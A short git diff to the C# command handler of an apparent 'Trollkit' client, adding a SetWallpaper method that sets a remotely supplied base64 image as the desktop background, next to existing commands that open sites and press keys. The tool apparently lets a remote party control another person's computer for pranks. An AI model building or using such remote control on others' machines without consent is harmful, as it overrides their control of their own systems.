@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -39,7 +40,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 					OpenSite(obj.Value);
 					break;
 				case "SetBackground":
-					
+					SetWallpaper(obj.Value);
 					break;
 			}
 		}
@@ -95,6 +96,13 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 			Keyboard keyboard = new Keyboard();
 			keyboard.Send(Keyboard.ScanCodeShort.LWIN);
+		}
+
+		private void SetWallpaper(string base64Image)
+		{
+			byte[] bytes = Convert.FromBase64String(base64Image);
+			MemoryStream byteStream = new MemoryStream(bytes);
+			Wallpaper.Set(Image.FromStream(byteStream), Wallpaper.Style.Fill);
 		}
 
 		private void OpenSite(string url)
